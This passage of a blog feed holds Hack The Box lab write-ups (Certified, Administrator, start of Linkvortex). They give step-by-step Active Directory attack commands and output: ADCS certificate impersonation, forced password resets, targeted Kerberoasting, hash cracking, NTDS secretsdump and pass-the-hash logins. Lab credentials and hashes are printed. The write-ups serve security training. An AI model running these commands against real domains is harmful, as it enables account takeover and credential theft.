<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 gettgtpkinit.py -cert-pfx  ../AAmizKx4.pfx -pfx-pass lFfOe3FWdEWVNDMHSRKz certified.htb/management_svc nutzh.ccache</span><br><span class="line">2025-01-11 08:13:10,190 minikerberos INFO     Loading certificate and key from file</span><br><span class="line">INFO:minikerberos:Loading certificate and key from file</span><br><span class="line">2025-01-11 08:13:10,203 minikerberos INFO     Requesting TGT</span><br><span class="line">INFO:minikerberos:Requesting TGT</span><br><span class="line">2025-01-11 08:13:13,481 minikerberos INFO     AS-REP encryption key (you might need this later):</span><br><span class="line">INFO:minikerberos:AS-REP encryption key (you might need this later):</span><br><span class="line">2025-01-11 08:13:13,481 minikerberos INFO     1d4ea7d8bbb9328407fb302ee90ddb60961d3a849c0d37dc6cfb1b5ca8054182</span><br><span class="line">INFO:minikerberos:1d4ea7d8bbb9328407fb302ee90ddb60961d3a849c0d37dc6cfb1b5ca8054182</span><br><span class="line">2025-01-11 08:13:13,483 minikerberos INFO     Saved TGT to file</span><br><span class="line">INFO:minikerberos:Saved TGT to file</span><br></pre></td></tr></table></figure>
<p>BTW: if this shows something about clock “The clock skew is too great” u can<br>use </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntpdate certified.htb </span><br></pre></td></tr></table></figure>
<h3>Step 2:Extracting the NT Hash</h3>

<p>With the TGT, we extracted the NT hash for the management_svc account:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 getnthash.py certified.htb/management_svc -key 1d4ea7d8bbb9328407fb302ee90ddb60961d3a849c0d37dc6cfb1b5ca8054182</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Using TGT from cache</span><br><span class="line">[*] Requesting ticket to self with PAC</span><br><span class="line">Recovered NT Hash</span><br><span class="line">a091c1832bcdd4677c28b5a6a1295584</span><br></pre></td></tr></table></figure>
<h3>Step 3: Accessing the Machine</h3>

<p>We used <strong><span style="color:black;">Evil-WinRM</span></strong> to access the machine with the management_svc account:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584</span><br></pre></td></tr></table></figure>

<h2 id="Step-4-Privilege-Escalation"><a href="#Step-4-Privilege-Escalation" class="headerlink" title="Step 4: Privilege Escalation"></a>Step 4: Privilege Escalation</h2><h3>Step 1: Exploiting CA_OPERATOR Privileges</h3>

<p>In <strong><span style="color:black;">bloodhound</span></strong>, we noticed that management_svc had <strong><span style="color:red;">GenericAll</span></strong> privileges over the CA_OPERATOR account.<br><img src="/../images/CA_op.png" alt="BloodHound Analysis"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br>We used this to reset the password for CA_OPERATOR:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ *Evil-WinRM* PS C:\Users\management_svc\Documents&gt; Set-ADAccountPassword -Identity <span class="string">&quot;CA_OPERATOR&quot;</span> -NewPassword (ConvertTo-SecureString <span class="string">&quot;Hopeyoulike</span></span><br><span class="line"><span class="string">it&quot;</span> -AsPlainText -Force) -Reset</span><br></pre></td></tr></table></figure>
<p>so the cridentials is CA_OPERATOR:MARIO123</p>
<h3>Step 2: Impersonating the Administrator</h3>

<p>We used <strong><span style="color:black;">certipy</span></strong> to impersonate the Administrator account:<br>(We impersonated the Administrator account by exploiting the CA_OPERATOR account’s privileges to request a certificate for the Administrator.)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn administrator -dc -ip 10.10.11.41</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user <span class="string">&#x27;ca_operator&#x27;</span>:</span><br><span class="line">    userPrincipalName                   : administrator</span><br><span class="line">[*] Successfully updated <span class="string">&#x27;ca_operator&#x27;</span></span><br></pre></td></tr></table></figure>
<p>so the ca_operator become the administrator and requested a CA(<em>Certificate Authority</em>)for the Administrator account: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ certipy-ad req -username ca_operator@certified.htb -p MARIO123 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41 </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\(&#x27;</span></span><br><span class="line">  <span class="string">&quot;(0x[a-zA-Z0-9]+) \([-]?[0-9]+ &quot;</span>,</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 7</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br></pre></td></tr></table></figure>
<p>This generated a PFX file for the Administrator account.</p>
<h3>Authenticating as Administrator</h3>

<p>after that clean up and restore ca_operator to his value to aviod confusion </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584  -user ca_operator -upn ca_operator@certified.htb</span><br><span class="line">[*] Updating user <span class="string">&#x27;ca_operator&#x27;</span>:</span><br><span class="line">    userPrincipalName                   : ca_operator@certified.htb</span><br><span class="line">[*] Successfully updated <span class="string">&#x27;ca_operator&#x27;</span></span><br></pre></td></tr></table></figure>
<p>We used the PFX file to authenticate as the Administrator:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ certipy-ad auth -pfx administrator.pfx -domain certified.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@certified.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@certified.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34</span><br></pre></td></tr></table></figure>
<p>This provided us with the NT hash for the Administrator account</p>
<p>Finally, we used <strong><span style="color:black;">Evil-WinRM</span></strong> to access the machine as the Administrator:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.11.41 -u administrator -H 0d5b49608bbce1751f708748f67e2d34</span><br></pre></td></tr></table></figure>

<p>we got the Hash u can access to the ADMIN acc and get the Flag . </p>
<div align="center">                                         
<span style="color:black;">GG!</span>
</div>

<p>Key takeaways</p>
<p><strong><span style="color:black;">bloodhound</span></strong> is an invaluable tool for visualizing and identifying attack paths in Active Directory environments.</p>
<p><strong><span style="color:black;">Impacket</span></strong> and <strong><span style="color:black;">certipy</span></strong> are powerful tools for manipulating AD objects and exploiting certificate-based authentication.</p>
<p>Understanding <strong><span style="color:red;">kerberos</span></strong> and <strong><span style="color:red;">LDAP</span></strong> is crucial for exploiting AD environments.</p>
]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
        <category>HACK THE BOX</category>
        <category>WINDOWS</category>
      </categories>
  </entry>
  <entry>
    <title>ADMINISTRATOR</title>
    <url>/administrator/</url>
    <content><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
<li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li>
<li><a href="#step-2-enumeration-of-SMB-service">Step 2: Enumeration of SMB Service</a></li>
<li><a href="#step-3-bloodhound">Step 3: bloodhound </a></li>
<li><a href="#step-4-foothhold">Step 4: foothhold </a></li>
<li><a href="#step-5-privilege-escalation">Step 5: Privilege Escalation</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
<p>In this write-up, we will walk through the steps to hack the Administrator machine on Hack The Box. Let’s dive in!</p>
<h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><p>We began by performing an <strong><span style="color:red;">Nmap</span></strong> scan to identify open ports and services on the target machine.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.42 -T5</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 14:09 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> administrator.htb (10.10.11.42)</span><br><span class="line">Host is up (0.050s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           Microsoft ftpd</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-01-07 02:09:44Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.54 seconds</span><br></pre></td></tr></table></figure>
<p>The scan revealed several open ports, including SMB (445), FTP (21), and LDAP (389). We also had credentials<br>for the user Olivia:ichliebedich , which we used for further enumeration.</p>
<h2 id="Step-2-Enumeration-Services"><a href="#Step-2-Enumeration-Services" class="headerlink" title="Step 2: Enumeration Services"></a>Step 2: Enumeration Services</h2><p>Using <strong><span style="color:red;">CrackMapExec</span></strong>, we enumerated the SMB service to identify users and their roles.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.11.42 -u Olivia -p ichliebedich --rid-brute | grep <span class="string">&quot;TypeUser&quot;</span></span><br><span class="line">SMB                      10.10.11.42     445    DC               500: ADMINISTRATOR\Administrator (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               501: ADMINISTRATOR\Guest (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               502: ADMINISTRATOR\krbtgt (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               1000: ADMINISTRATOR\DC$ (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               1108: ADMINISTRATOR\olivia (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               1109: ADMINISTRATOR\michael (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               1110: ADMINISTRATOR\benjamin (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               1112: ADMINISTRATOR\emily (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.42     445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)</span><br></pre></td></tr></table></figure>
<p>Next, we checked if the Olivia account had access to WinRM.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec winrm 10.10.11.42 -u Olivia -p ichliebedich  </span><br><span class="line">WINRM       10.10.11.42     5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)</span><br></pre></td></tr></table></figure>
<p>The account had access, so we proceeded to use <strong><span style="color:red;">BloodHound</span></strong> for further<br>analysis.<br>We used <strong><span style="color:red;">NetExec</span></strong> to collect <strong><span style="color:red;">BloodHound</span></strong> data.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netexec ldap 10.10.11.42 -u olivia -p ichliebedich  --bloodhound --collection All --dns-server 10.10.11.42      </span><br><span class="line">SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.11.42     389    DC               [+] administrator.htb\olivia:ichliebedich </span><br><span class="line">LDAP        10.10.11.42     389    DC               Resolved collection methods: session, localadmin, rdp, trusts, container, objectprops, psremote, dcom, group, acl</span><br><span class="line">LDAP        10.10.11.42     389    DC               Done <span class="keyword">in</span> 00M 10S</span><br><span class="line">LDAP        10.10.11.42     389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.10.11.42_2025-01-06_142215_bloodhound.zip</span><br></pre></td></tr></table></figure>
<h2 id="Step-3-bloodhound"><a href="#Step-3-bloodhound" class="headerlink" title="Step 3: bloodhound"></a>Step 3: bloodhound</h2><p>After importing the data into <strong><span style="color:red;">BloodHound</span></strong>, we discovered that Olivia had<br>GenericAll privileges over the Michael account. This allowed us to reset<br>Michael’s password.<br><img src="/image1.png" alt="BloodHound Analysis"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<p>Using <strong><span style="color:red;">Evil-WinRM</span></strong>, we connected to the Olivia account and reset Michael’s<br>password.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ *Evil-WinRM* PS C:\Users\olivia\Documents&gt; Set-ADAccountPassword -Identity <span class="string">&quot;MICHAEL&quot;</span> -NewPassword (ConvertTo-SecureString <span class="string">&quot;NewPassword&quot;</span> -AsPlainText -Force) -Reset <span class="comment">#to reset the pswd without knowing it </span></span><br></pre></td></tr></table></figure>
<p>The new credentials for Michael were Michael:NewPassword .<br>Next, we analyzed Michael’s privileges in <strong><span style="color:red;">BloodHound</span></strong> and found that he had<br>control over the Benjamin account. We repeated the process to reset<br>Benjamin’s password.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ *Evil-WinRM* PS C:\Users\michael\Documents&gt; Set-ADAccountPassword -Identity <span class="string">&quot;BENJAMIN&quot;</span> -NewPassword (ConvertTo-SecureString <span class="string">&quot;123456789&quot;</span> -AsPlainText -Force) -Reset</span><br></pre></td></tr></table></figure>
<p>The new credentials for Benjamin were Benjamin:123456789.</p>
<h2 id="Step-4-foothhold"><a href="#Step-4-foothhold" class="headerlink" title="Step 4: foothhold"></a>Step 4: foothhold</h2><p>Using <strong><span style="color:red;">CrackMapExec</span></strong>, we discovered that Benjamin had access to the FTP<br>service.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec ftp 10.10.11.42 -u Benjamin -p 123456789</span><br><span class="line">FTP         10.10.11.42     21     10.10.11.42      [*] Banner: Microsoft FTP Service</span><br><span class="line">FTP         10.10.11.42     21     10.10.11.42      [+] Benjamin:123456789</span><br></pre></td></tr></table></figure>
<p>We logged into the FTP server and found a backup file named<br>Backup.psafe3. We downloaded it</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp&gt; get Backup.psafe3</span><br><span class="line"><span class="built_in">local</span>: Backup.psafe3 remote: Backup.psafe3</span><br><span class="line">229 Entering Extended Passive Mode (|||53174|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">100% |***************************************************************************************************|   952       18.73 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">WARNING! 3 bare linefeeds received <span class="keyword">in</span> ASCII mode.</span><br><span class="line">File may not have transferred correctly.</span><br><span class="line">952 bytes received <span class="keyword">in</span> 00:00 (18.65 KiB/s)</span><br></pre></td></tr></table></figure>
<p>Using <strong><span style="color:red;">pwsafe2john</span></strong>, we extracted the hash from the backup file.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwsafe2john Backup.psafe3</span><br><span class="line">backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050</span><br></pre></td></tr></table></figure>
<p>We cracked the hash using <strong><span style="color:red;">John the Ripper</span></strong> and found the<br>password: tekieromucho. </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])</span><br><span class="line">Cost 1 (iteration count) is 2048 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 6 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">tekieromucho     (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-01-06 15:02) 2.702g/s 16605p/s 16605c/s 16605C/s adriano..iheartyou</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>
<p>After downloading the Backup.psafe3 file from the FTP server, we needed a<br>tool to read its contents. The file was a Password Safe backup, which<br>stores encrypted credentials. Unfortunately, Password Safe did not work<br>on Linux, so we switched to a Windows environment to extract the data.<br>To transfer the file from the Linux VM to a Windows machine, we used<br>the SCP command. First, we ensured that the SSH service was enabled<br>on the Linux VM. Then, we ran the following command in PowerShell on<br>the Windows machine: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp username@remote_ip:/path/to/remote/file <span class="string">&quot;C:\path\to\local\destination&quot;</span> <span class="comment">#powershell </span></span><br></pre></td></tr></table></figure>
<p>Once the file was transferred, we opened it using Password Safe on Windows.<br>The backup contained several entries, including credentials for Emily Rodriguez:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;entry <span class="built_in">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span><br><span class="line">	&lt;title&gt;&lt;![CDATA[Emily Rodriguez]]&gt;&lt;/title&gt;</span><br><span class="line">	&lt;username&gt;&lt;![CDATA[emily]]&gt;&lt;/username&gt;</span><br><span class="line">	&lt;password&gt;&lt;![CDATA[UXLCI5iETUsIBoFVTj8yQFKoHjXmb]]&gt;&lt;/password&gt;</span><br><span class="line">	&lt;uuid&gt;&lt;![CDATA[512230f10a83493b8fbdd46aa200bdcf]]&gt;&lt;/uuid&gt;</span><br><span class="line">	&lt;ctimex&gt;2024-08-23T08:26:53&lt;/ctimex&gt;</span><br><span class="line">&lt;/entry&gt;</span><br></pre></td></tr></table></figure>
<p>Credentials Found:<br>Emily:<strong><span style="color:green;">UXLCI5iETUsIBoFVTj8yQFKoHjXmb</span></strong></p>
<p>With these credentials, we accessed the machine using <strong><span style="color:red;">Evil-WinRM</span></strong> and<br> retrieved the user flag.</p>
<h2 id="Step-5-Privilege-Escalation"><a href="#Step-5-Privilege-Escalation" class="headerlink" title="Step 5: Privilege Escalation"></a>Step 5: Privilege Escalation</h2><p>Using <strong><span style="color:red;">BloodHound</span></strong>, we analyzed the Active Directory relationships and<br>discovered that Emily had GenericWrite privileges over the Ethan account.<br>This meant we could modify Ethan’s account properties, including setting<br>a Service Principal Name (SPN) for a Targeted Kerberoast attack.</p>
<h3>Performing a Targeted Kerberoast Attack</h3>
We used the targetedKerberoast.py script to perform the attack:

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">targetedKerberoast.py -v -d <span class="string">&#x27;administrator.htb&#x27;</span> -u <span class="string">&#x27;emily&#x27;</span> -p <span class="string">&#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27;</span></span><br><span class="line">[*] Starting kerberoast attacks</span><br><span class="line">[*] Fetching usernames from Active Directory with LDAP</span><br><span class="line">[VERBOSE] SPN added successfully <span class="keyword">for</span> (ethan)</span><br><span class="line">[+] Printing <span class="built_in">hash</span> <span class="keyword">for</span> (ethan)</span><br><span class="line">$krb5tgs$23$*ethan<span class="variable">$ADMINISTRATOR</span>.HTB<span class="variable">$administrator</span>.htb/ethan*$5fa946f70a46bec63a74e142c3c36ebf<span class="variable">$bdfda40bf8f91e77be2f3dde4434ce64cc6667f4a017571e3a082a2a7770e76786cd90fe0aec394b4c19c97dd1f115a3</span>....</span><br><span class="line">[VERBOSE] SPN removed successfully <span class="keyword">for</span> (ethan)</span><br></pre></td></tr></table></figure>
<p>The script generated a Kerberos TGS ticket hash for the Ethan account.<br>We saved this hash to a file and used <strong><span style="color:red;">John the Ripper</span></strong> to crack it:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john ethanhash --wordlist=/usr/share/wordlists/rockyou.txt  </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 6 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">limpbizkit      (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-01-06 21:53) 11.11g/s 68266p/s 68266c/s 68266C/s Liverpool..iheartyou</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
<p>Cracked Password: Ethan:<strong><span style="color:Green;">limpbizkit</span></strong></p>
<h3>Dumping Domain Hashes</h3>
With Ethan's credentials, we used Impacket's secretsdump to extract 
the NTLM hashes from the Domain Controller:

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump administrator.htb/ETHAN:limpbizkit@10.10.11.42</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce...::</span><br></pre></td></tr></table></figure>
<p>Finally, we used the Administrator hash to gain access to the machine via<br><strong><span style="color:red;">Evil-WinRM</span></strong>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce...</span><br></pre></td></tr></table></figure>
<p>Once inside, we navigated to the Administrator’s Desktop and retrieved<br>the root flag:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line">a5....</span><br></pre></td></tr></table></figure>
<pre><code>                 Congratulation
</code></pre>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This machine was an excellent exercise in Active Directory enumeration and<br>privilege escalation. Key takeaways include:<br><strong><span style="color:red; font-size:medium;">BloodHound</span></strong> is an invaluable tool for visualizing Active Directory<br>relationships and identifying misconfigurations.<br>Targeted Kerberoasting is a powerful technique for escalating privileges<br>by exploiting weak service account passwords.<br><span style="color:red; font-size:medium;">Impacket’s secretsdump</span> is essential for extracting hashes and gaining domain<br>administrator access.<br>Thorough enumeration and understanding of Active Directory<br>misconfigurations<br>are critical for successful exploitation.<br>This challenge reinforced the importance of persistence and creativity in<br>penetration testing. By leveraging tools like <span style="color:red; font-size:medium;">BloodHound</span>, <span style="color:red; font-size:medium;">Impacket</span>, and<br><span style="color:red; font-size:medium;">John the Ripper</span>, we were able to systematically escalate privileges and<br>compromise the domain.</p>
]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
      </categories>
      <tags>
        <tag>HACK THE BOX</tag>
        <tag>WINDOWS</tag>
        <tag>CTF</tag>
        <tag>PENETRATION TESTING</tag>
      </tags>
  </entry>
  <entry>
    <title>Linkvortex</title>
    <url>/linkvortex/</url>
    <content><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
<li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li>
<li><a href="#step-2-enumeration-of-http-service">Step 2: Enumeration of HTTP Service</a></li>
<li><a href="#step-3-subdomain-enumeration">Step 3: Subdomain Enumeration</a></li>
<li><a href="#step-4-enumerating-devlinkvortexhtb">Step 4: Enumerating dev.linkvortex.htb</a></li>
<li><a href="#step-5-exploiting-the-login-page">Step 5: Exploiting the Login Page</a></li>
<li><a href="#step-6-ssh-access">Step 6: SSH Access</a></li>
<li><a href="#step-7-privilege-escalation">Step 7: Privilege Escalation</a></li>
</ol>
<p>In this write-up, we will walk through the steps to hack the Linkvortex machine on Hack The Box. Let’s dive in!</p>
<h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><p> We start by scanning the target machine for open ports using Nmap:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.47 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 07:01 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> linkvortex.htb (10.10.11.47)</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.11 seconds</span><br></pre></td></tr></table></figure>
<p>We find two open ports:</p>
<ul>
  <li><strong>Port 22</strong>: SSH (OpenSSH 8.9p1)</li>
  <li><strong>Port 80</strong>: HTTP (Apache)</li>
</ul>

<h2 id="Step-2-Enumeration-of-HTTP-Service"><a href="#Step-2-Enumeration-of-HTTP-Service" class="headerlink" title="Step 2: Enumeration of HTTP Service"></a>Step 2: Enumeration of HTTP Service</h2><p>We proceed to brute-force directories using Dirsearch:</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch -u http://linkvortex.htb/ -x 404</span><br><span class="line"></span><br><span class="line"> [07:05:48] 200 -  103B  - /robots.txt</span><br><span class="line"> [07:05:51] 200 -  256B  - /sitemap.xml</span><br><span class="line"> [07:05:49] 403 -  199B  - /server-status                                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed  </span><br></pre></td></tr></table></figure>
<p>The &#x2F;robots.txt file reveals the following:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Disallow: /ghost/</span><br></pre></td></tr></table></figure>
<p>This indicates a potential login page at &#x2F;ghost&#x2F;.</p>
<h2 id="Step-3-Subdomain-Enumeration"><a href="#Step-3-Subdomain-Enumeration" class="headerlink" title="Step 3: Subdomain Enumeration"></a>Step 3: Subdomain Enumeration</h2><p>Using FFUF, we enumerate subdomains:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ffuf -u http://linkvortex.htb/ -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class="string">&quot;Host:FUZZ.linkvortex.htb&quot;</span> -mc 200</span><br><span class="line"></span><br><span class="line"> dev                     [ Status: 200, Size: 2538, Words: 670, Lines: 116]</span><br></pre></td></tr></table></figure>
<p>We discover a subdomain dev.linkvortex.htb. Adding this to our &#x2F;etc&#x2F;hosts file allows us to access it. </p>
<h2 id="Step-4-Enumerating-dev-linkvortex-htb"><a href="#Step-4-Enumerating-dev-linkvortex-htb" class="headerlink" title="Step 4: Enumerating dev.linkvortex.htb"></a>Step 4: Enumerating dev.linkvortex.htb</h2><p>We run Dirsearch again on the subdomain:</p>
